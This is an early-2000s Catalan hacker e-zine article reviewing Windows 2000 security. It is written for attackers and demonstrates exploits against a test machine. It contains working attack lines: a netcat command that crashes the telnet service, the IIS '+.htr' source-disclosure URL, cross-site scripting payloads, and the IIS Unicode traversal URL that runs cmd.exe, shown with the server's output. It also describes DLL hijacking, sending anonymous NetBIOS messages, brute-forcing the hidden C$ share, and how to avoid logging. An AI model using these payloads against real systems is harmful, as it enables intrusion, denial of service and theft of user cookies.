@@ -1,0 +1,501 @@
+.------------------.
+| CatHack #007 - 3 |
+| 07x09 - w2k-secu |
+| programació/hack |
+| --[ adjunts ]--  |
+| . jolt2.c        |
+`------------------'
+
+&&   &&  &&&&  &&  &&  #########################################&&
+&&   && &&  && && &&   ##                                       &&
+&&   &&    &&  &&&&    ##  Windows 2000 Security Advertisement  &&
+&& & &&   &&   && &&   ##                                       &&
+ && &&  &&&&&& &&  &&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+                                                 |
+ .----------------------;------------------------'
+| by Pop.tPH / CatHack! |
+| (Pancake on irc&mail) |
+|  poptph@hotmail.com   |
+`-----------------------'
+
+Benvinguts, xicotens!
+
+Aquest cop us he preparat un article força interessant, més que res, per
+la seva actualitat, el Windows2000 (bé, ja fa un any), pero es que sóc
+d'efectes retardats. :) Doncs, bé, la qüestió es que vaig veure un nombre,
+el 63.000, que indicava el numero de fallos de seguretat que s'havien
+trobat en la primera sortida a la venta.
+
+Quan vaig conseguir tancar la boca (com pot ser que les peles obliguin
+a treure productes tant defectuosos???), doncs bé...el capitalisme sempre
+amb les seves. La qüestió es que la PC WORLD com molts recordareu la va
+cagar, i en lloc d'oferir una versió beta oferia la versió sencera ...
+ups fallo tonto...po fueno, la qüestió es que després de llegir totes les
+critiques...vaig llençar-me a instal.lar-lo.
+
+NOTA: En aquest article pretenc parlar en general sobre el windows 2000,
+tant d'aspectes interns com externs, comentaré la seguretat per defecte
+(fallos de seguretat, per culpa de males configuracions inicials) i tb
+de fallades com DoS en serveis i altres problemes com l'explorer 5.
+També faré una rapida vista desde linux (aprofito q els tinc en xarxa i
+trepitxejo una mica els dos sistemes).
+
+4 disquets...quin pal d'arranc!! (1a queixa)...bueno, la instalació força
+estupida...ja que l'unica opció que recordo modificar es la d'escollir
+FAT32, NTFS i la data i el teclat a català. Per cert, el formateig a ntfs
+es mortalment lent. No el veig gaire optim.
+
+Acabada la instalació, podem veure els aspectes nous...mmh la configuració
+de xarxa es fa bastant més logica i integrada que abans (firewall (força
+limitat, tot s'ha de dir), dns...i demés.) bastant facil. Podem veure com
+a novetat un cursor amb sobra 3D i els menus desplegables apareixen amb
+sombreig...molt util per un servidor...Pero bueno deixant apart l'apartat
+grafic. (ja que aquest es menja un 5-10% dels recursos del sistema en un
+p200mmx 64MBram).
+
+Per defecte el sistema ens instal.la el servidor NetBios, Telnet i d'altres.
+Per instal.lar el servidor web, ftp, dns, i smtp cal fer-ho desde agregar
+o quitar programas. (el sistema ocupa uns 750mb).
+
+Comencem a comentar la principal novetat del sistema en quant a serveis:
+el telnet, principalment al ser un servei de *nix i a sobre mode text,
+windows es veia força allunyat en qüestió d'accés remot. La configuració
+per defecte es pot trobar a:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0
+
+Intento conectarme desde el linux, primera sorpresa!!
+
+
+---
+Trying 192.168.0.1...
+Connected to p200.
+Escape character is '^]'
+
+Server allows NTLM authentication only
+Server has closed connection
+                            Connection closed by foreign host.
+---
+
+Windows denega les conexions desde fora de maquines amb windows NT/2k, ja
+que utilitza una autentificació propia anomenada NTLM, per solucionar
+aquest problema ho podem solucionar modificant l'entrada del registre
+
+NTLM (esta en valor 2 per defecte), si el posem a 1 o a 0 podrem accedir
+desde maquines no-NT. Bueno, us deixo que veieu les entrades del registre
+de configuració del telnet.
+
+AllowTrustedDomain   REG_DWORD      0x00000001 (1)
+AltKeyMapping        REG_DWORD      0x00000001 (1)
+DefaultDomain        REG_EXPAND_SZ  .
+DefaultShell         REG_EXPAND_SZ  %SystemRoot%\system32\cmd.exe /q /k
+LoginScript          REG_EXPAND_SZ  %SystemRoot%\system32\login.cmd
+MaxConnections       REG_DWORD      0x0000003f (63)
+MaxFailedLogins      REG_DWORD      0x00000003 (3)
+NTLM                 REG_DWORD      0x00000002 (2)
+TelnetPort           REG_DWORD      0x00000017 (23)
+Termcap              REG_EXPAND_SZ  %SystemRoot%\system32\termcap
+
+o sino també podeu intentar d'emular el telnet de 2000 en linux...suposo
+que no tardarà en sortir. Bueno carguem el programa tlntadmin.exe (que
+desde mode texte ens permetrà cargar configurar i descargar el
+telnetserver.
+
+Ara vé lo divertit, configurem pq admeti conexions no-NT, el carguem.
+Anem a la maquina linux del costat i fem:
+
+cat /dev/hda | nc 192.168.0.1 23
+
+i beep! : Error del programa
+          tlntsvr.exe ha generado errores y será cerrado por Windows.Debe
+          reiniciar el programa. Se creará un registro de error.
+
+L'hem petat. i ja no tornara. :)
+
+El millor d'aixo és que si l'administrador no veu aquest MessageBoxA, a
+no ser que faci un portscan a si mateix no podrà saber que ha caigut el
+telnetd, aixo és pq els logs, loguejen només les operacions valides, o
+sigui si tanques el tlntsvr.exe manualment, doncs si que surt, pero si
+aquest es penja, no surt en els logs.
+
+
+
+WEB: (que per cert va amb IIS5 )
+
+El servidor web podem contemplar la tipica fallada del +.htr, aquest fallo
+permet la lectura de fitxers CGI remotament, i si podem saber el cf de
+l'script podem arribar a trobar algun fallo de DoS o buffer overflow.
+Aquest fallo permet la lectura de fitxers (alguns .asp no :(  pero bueno,
+els perl i altres normalment si.
+
+Si fem memoria, el fallo +.htr en NT era ficant un %3F entre el nom i
+l'htr, per exemple en NT4:
+
+    http://victima.com/scripts/test.pl%3F+.htr
+
+I llavors podriem llegir el codi del fitxer test.pl. (q per cercert, en
+w2k no ve cap cgi per defecte en /scripts/ (C:\InetPUB\Scripts), bé,
+doncs la cosa es que com la finalitat de Windows es la de fer les coses
+més facils, (fins hi tot pels hackers) ara podem llegir les CGIs
+(.asp no es deixa) sense haver de posar %3F xDD facil no? doncs probem:
+
+executem desde la maquina w2k local.
+echo "HOLA SOC UN FITXER NO LLEGIBLE" > c:\inetpub\scripts\test.pl
+
+anem al navegador i carguem:
+
+   http://localhost/scripts/test.pl+.htr
+
+increible! podem llegir una CGI!! - no se com s'ho fan per fer-ho tant
+malament.
+
+
+L'altre fallo del IIS5 es el de poder fer que el servidor ens envii el
+que volguem o sigui podem fer que el servidor executi un javascript
+enviat a nosaltres per llegir les cookies que no siguin nostres,
+Guninski, (la maquina troba-bugs ;) ens dona la idea de la URL d'abaix.
+si voleu que us funcioni cal canviar el codi de desdepres del "?".
+Prefereixo no endinsarme gaire en aquest tema, ja que afecta a la
+intimitat dels usuaris.
+
+http://localhost/null.htw?CiWebHitsFile=/iisstart.asp&CiRestriction="<SCRIPT>alert(document.domain)</SCRIPT>"
+
+
+Ara fliparem una mica quan veiem el fallo següent, es tracta del IIS5
+que permet executar comandos remotament...obrir contes, borrar
+passwords, llistar directoris, etc...administració remota accesible
+desde qualsevol usuari! (i després diuen que la microsoft es capitalista!
+si es ella la que facilita l'anarquisme informatic (ningu té control
+total del sistema)), Bueno, us deixo amb l'URL d'entrada i el resultat
+del navegador...simplement IMPRESIONANT.
+
+http://localhost/scripts/georgi.bat/..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c%20dir%20C:\ 
+
+---> resposta del servidor...
+
+ Directorio de C:\
+
+03/04/2001  19:26       <DIR>          Archivos de programa
+03/04/2001  18:30       <DIR>          Documents and Settings
+03/04/2001  19:31       <DIR>          Inetpub
+03/04/2001  19:46       <DIR>          WINNT
+               0 archivos              0 bytes
+               4 dirs     854.814.720 bytes libres
+<-----
+
+
+Tornant a l'error d'abans del "null.htw", també existeixen altres
+maneres de conseguir executar javascript remotament:
+
+http://localhost/<SCRIPT>alert('document.domain='+document.domain)</SCRIPT>.shtml
+
+o si no us acaba d'agradar tb podeu probar amb:
+
+http://localhost/_vti_bin/shtml.dll/<SCRIPT>alert('document.domain='+document.domain)</SCRIPT>
+
+A part d'executar javascript remotament tb podem llegir fitxers rera firewalls
+(logicament el httpd s'ho traga tot).
+
+
+Aprofitament de les DLLs:
+-------------------------
+Aquest es un tema molt complex i també molt interessant, es tracta
+d'aprofitar les DLLs per enganyar a programes perquè al cargar-les
+executin programes o ordres d'administrador.
+
+En Windows2000 només conec un cas, descovert per Guninski, el qual
+qualsevol usuari pot executar les ordres establertes en una DLL
+malevola.
+
+Aixo pot ser molt interesant pero es força complex i m'ho hauria
+de mirar desde nivell ensamblador...i no tinc gaire temps per
+culpa de la vida...
+
+La qüestió es que windows busca les DLLs primer en el directori
+actual de treball i despres ho mira dins de \system o \system32.
+
+Doncs bé, si fiquem una dll que necesiti un programa al cargar-se
+en el directori on hi ha un fitxer que s'obra amb ell, aquest
+agafara la nostra dll i no la del sistema, en conseqüència podem
+conseguir executar el que volguem.
+
+Exemple:
+
+Word necessita per carregar-se en el sistema les DLLs
+"riched20.dll" o "msi.dll", (el fallo en principi esta en
+aquestes dues, les altres potser tb), doncs podem subsituïrles,
+per versions malevoles, modificades amb rutines noves que
+permetin executar programes protegits i demés.
+
+RING 0:
+-------
+No cal comentar gaire cosa, ja que com ja sabreu si esteu una mica
+ficats en el mon del virii, arribar al ring0 significa tindre
+control total de la maquina...i com sabreu conseguir aixo, en
+windows no es gaire dificil..en linux impossible, pero amb el
+windows, son (de memoria) crec que son 10 linies d'ensamblador.
+
+
+
+NetBIOS:
+--------
+Com és normal en les famílies windows, s'ha estandaritzat l'us
+del netbios com a protocol estandar de xarxes, junt amb el TCP
+(que es veu obligat a utilitzar-lo per Internet), doncs bé, la
+gracia del NetBIOS és que es un protocol que crea una falsa
+xarxa organitzada per grups de treball, i aixo limita la xarxa
+només a un grup limitat de màquines.
+
+Pero potser el més divertit de tot és que es un protocol força
+manegable i que ens permet anonimitzar els nostres actes de
+manera fàcil, ja que podem realitzar accions desde qualsevol
+maquina a qualsevol altre maquina, podem utilitzar-les de
+condons.
+
+El problema principal que ens trobarem en el netbios de w2k, és
+que ens tindran controladíssims per tot arreu, ja que per llistar
+els serveis netbios de les maquines de dins d'una xarxa (el tipic
+"nbtstat -A"), w2k ens demanara diverses autentificacions per
+saber que som de la mateixa xarxa, coses com login, password, grup
+de treball, etc. Coses que si som de fora d'una xarxa no podrem
+saber-les :(((, aixo potser és la part segura del NetBIOS de w2k.
+
+Pero el que passa es que si només hi ha una sola maquina de dins
+d'aquesta xarxa que funcioni sense w2k, (w98, wNT, Linux, etc.)
+podrem llistar aquests serveis, utilitzarem aquesta maquina de
+condó per veure els serveis de totes les maquines d'aquesta xarxa.
+
+NetBIOS ens permet juntar tota una xarxa en una sola maquina amb
+diversos serveis.
+
+Aixo és força util per diverses raons, una cosa força divertida
+que se m'acodeix és la de utilitzar els missatges winPopup de
+windows, pero cridant-los desde linux. Windows, com sabeu no ens
+deixarà fer gaires coses, ja que per exemple (cosa lletja) si
+per exemple l'admin entra a un directori d'admin d'una maquina
+remota desde una conta d'usuari normal, li demanarà password,
+pero només el primer cop. Els següents accessos seràn "gratuïts".
+
+Doncs bé anem a divertir-nos, us faré només un exemple del que
+és l'anonimització que significa NetBIOS:
+
+Anem a linux...
+
+i fem:
+
+cathack@p60:~$ smbclient //victima.com/ -M victima.com -U "tu puta madre"
+added interface ip=192.168.0.2 bcast=192.168.0.255 nmask=255.255.255.0
+Got a positive name query response from 192.168.0.1 ( 192.168.0.1 )
+Connected. Type your message, ending it with a Control-D
+ANDREU QUE TE DEN.
+<control+D>
+
+llavors la maquina victima rebra un popup amb el missatge:
+
+ .---[Messenger Service]-------------------------------------------.
+|  Mensaje de tu puta madre a victima.com el 16/04/2001 23:29:43   |
+|                                                                  |
+|  ANDREU QUE TE DEN.                                              |
+|                                                                  |
+|                         [ Aceptar ]                              |
+`------------------------------------------------------------------'
+
+Una altre cosa que em va cridar l'atenció és que per defecte, w2k (al
+igual que wNT) comparteixen el disc dur, es comparteix el disc dur
+sencer protegit amb password d'administrador.
+
+Crec que els usuaris haurien de poder escollir si volen o no compartir-lo,
+i a més, que els hi costa dibuixar una mà sota l'icona del disc dur, pq
+si no fas propiedades no hi ha manera de saber que està compartit, pq
+el comparteix com a directori ocult.
+
+Windows com ha pogut demostrar amb l'arribada de diversos virus, amaga
+moltes extensions, i una d'elles, és l'us del simbol '$' per amagar tot
+el nom, l'hem d'escriure per poder accedir-hi. D'aquesta manera, per
+més que llistem els serveis amb nbtstat -A mai veurem que estan compartint
+el disc dur, pq està amagat sota la direcció de:
+
+           //victima.com/C$
+
+El millor de tot és que comparteix el disc dur i no li dona auditoria per
+defecte (cosa que hauria d'estar possada).
+
+Com bé sabem sempre podem donar-nos al tipic brute-force d'un passtry com
+el NAT, per anar probant passwords d'administrador fins que l'encerti, ens
+armem amb un bon generador de diccionaris i molta paciencia...i anar fent,
+pq el sistema no logueja xD.
+
+
+
+
+
+ROUTE:
+------
+
+Les taules d'enrutament, brillen per la seva mala configuració, no
+entenc com pot haver aquesta configuració per defecte...
+
+C:\>route print
+===========================================================================
+ILista de interfaces
+0x1 ........................... MS TCP Loopback interface
+0x2 ...00 60 67 67 ef 20 ...... Realtek RTL8029(AS) Ethernet Adapt
+===========================================================================
+===========================================================================
+Rutas activas:
+Destino de red        Máscara de red   Puerta de acceso   Interfaz  Métrica
+        127.0.0.0        255.0.0.0        127.0.0.1       127.0.0.1       1
+      192.168.0.0    255.255.255.0      192.168.0.1     192.168.0.1       1
+      192.168.0.1  255.255.255.255        127.0.0.1       127.0.0.1       1
+    192.168.0.255  255.255.255.255      192.168.0.1     192.168.0.1       1
+        224.0.0.0        224.0.0.0      192.168.0.1     192.168.0.1       1
+  255.255.255.255  255.255.255.255      192.168.0.1     192.168.0.1       1
+===========================================================================
+Rutas persistentes:
+  ninguno
+
+mai arribaré a entendre la mascara 224.0.0.0. Lo millor és que aquesta mala
+configuració (que es reflecteix en el rendiment de la màquina i de tota la
+xarxa en general), es vé arrastrant desde el windows NT.
+
+Existeixen diversos fallos que no he pogut comprobar per diverses raons,
+principalment pq com ja sabeu, la majoria d'exploits no funcionen per la
+simple raó que si funcionessin tothom aniria porai tirant servidors
+(script kiddies).
+
+He arreglat alguns, pero no els he pogut arreglar tots, entre els que
+m'interessaven estava un bufferoverflow al servidor web que et permet
+obrir una conta shell com a root al port 8008, pero com acostuma a
+passar, no funciona...vaig arreglar el codi, pero tot hi aixi deu
+estar malament la shell o la mida d'aquesta.
+
+Aixi que no els he pogut comprobar, pero si us interessa, podeu
+passar-vos pels links de www.hack.co.za on trobareu quantitat
+d'exploits que no funcionen, pero que son actuals...només haureu
+d'aprendre a programar per arreglar-los.
+
+Us dono una petita llista:
+
+jolt2.c - Estem parlant d'una especie de revolució del tipus "winnuke",
+          resulta que ha sorgit un problema força greu en totes les
+          maquines windows (9x,NT,2k) (dubto de les ME i de les futures
+          versions XP). El que fa es enviar paquets IGMP mal formats,
+          i quan son rebuts, la maquina es penja de manera tonta...
+          Lo més fort es que aquest fallo tb es troba a l'ultima
+          versió del SP, la 6.
+          Malgrat aixo, que es el que diuen l'unic que he conseguit fer
+          amb aquest atac és ralentitzar la maquina de manera
+          considerable, el payload de l'atac és força semblant al
+          del x-shock.
+          Us adjunto el cf del jolt2.c pq li feu marranades i el
+          probeu. (amb finalitats educatives).
+
+En teoria la maquina també hauria de sucumbir sota un atac de IGMP
+i fragmentació (fawx), pero no és aixi.
+
+Però no tot és dolent...sempre trobem amb millores que ens criden
+l'atenció, com la millora de l'estabilitat, aixo implica una
+protecció contra caigudes del sistema...encara no se m'ha penjat,
+quan normalment, els sistemes windows a mi em duren 2 hores tirant
+llarg sense penjar-se.
+
+He testejat diversos atacs, com el potent misfrag o l'octopus, pero
+no hi han hagut resultats, bé si, llegir una miqueta el disc dur.
+Sembla que té tots els serveis bastant ben escrits excepte el
+telnet que té forats per tot arreu, i el dimoni http.
+
+Per cert, al fer un atac octopus, el servidor smtp del w2k limita
+les conexions, i quan aquestes són superades, les tanca i les
+informa als logs del sistema...Us recomano no atacar d'aquesta
+manera, ja que se us veu la IP.
+
+Si us interessa saber tots els serveis que w2k és capaç de controlar
+vaig fer-li un nmap...
+
+Starting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+Interesting ports on p200 (192.168.0.1):
+Port    State       Protocol  Service
+7       open        tcp        echo
+9       open        tcp        discard
+13      open        tcp        daytime
+17      open        tcp        qotd
+19      open        tcp        chargen
+21      open        tcp        ftp
+25      open        tcp        smtp
+80      open        tcp        http
+135     open        tcp        loc-srv
+139     open        tcp        netbios-ssn
+443     open        tcp        https
+445     open        tcp        microsoft-ds
+515     open        tcp        printer
+1025    open        tcp        listen
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 1 second       
+
+
+Per cert, la versió testejada es la 5.00.2195, i sembla que han
+arreglat forces fallos de kernel com el de l'atac DoS del trashX
+i un fallo de buffer overflow en el servidor ftp (que el buffer
+d'entrada de login es feia amb un buffer de 512 bytes. Aixo
+permetia execucions arbitraries remotes.
+
+-> Es bo saber que microsoft arregla part dels seus fallos de
+seguretat en versions posteriors. Malgrat aquesta sigui la
+versió definitiva i la que marcarà la nova generació de kernels
+substituïnt els del w9x. (que inclou el wME).
+
+<popnote>
+
+Si volem riure una estoneta podem dirigir-nos al executable:
+C:\WINNT\discover.exe
+
+Alla podreu llegir la propaganda que microsoft dona del seu
+producte, com per exemple "més facil d'utilitzar", "més facil
+d'administar". "Més compatible" (amb que?), "més eficaç" xDD
+"més fàcil d'instal.lar" (xDD, no m'extranya, es que durant
+la instal.lació no et demana la teva opinió!
+
+Pero després de llegir tanta propaganda no recordo haver llegit
+per enlloc el lema de "Més segur" xDD
+
+</popnote>
+
+Per cert, de moment per més que ho intenti, windows, mai podrà
+arribar al nivell de linux, no només de seguretat, sino de
+interacció amb l'administrador (nivell de configuració) i de
+possibilitats d'actualització (nous protocols, etc.)
+
+Tot hi aixi crec que aquest és malgrat ser un xic lent, i
+tindre forats per tot arreu, és el millor windows que ha
+sortit fins ara.
+
+A la conclusió que he arribat després de fer l'article és que
+l'unica cosa que fa amb seguretat Windows 2000 és apagar-se.
+
+
+PD: Cal a dir que després d'escriure aquest article han sortit
+    a la vista bastants fallos de seguretat, pero no estic
+    per escriurel's...aixi que espavileu-vos una miqueta si
+    us interesa.
+
+
+          QUE APROFITI!!!! -burp
+
+Bibliografia:
+      * http://www.guninski.org
+      * http://www.hack.co.za
+      * think://localmind/      ;)
+
+
+                     _______________
+                    |               |
+                    |      POP      |
+                    |_______________|
+-----------.___             |
+._.----.___.---(ºoº)--------'
+___.-.______.--'
+
+
+                                    juga amb ells...
+                                           ...pren privilegis...
+                                                   ...trenca amb tot.
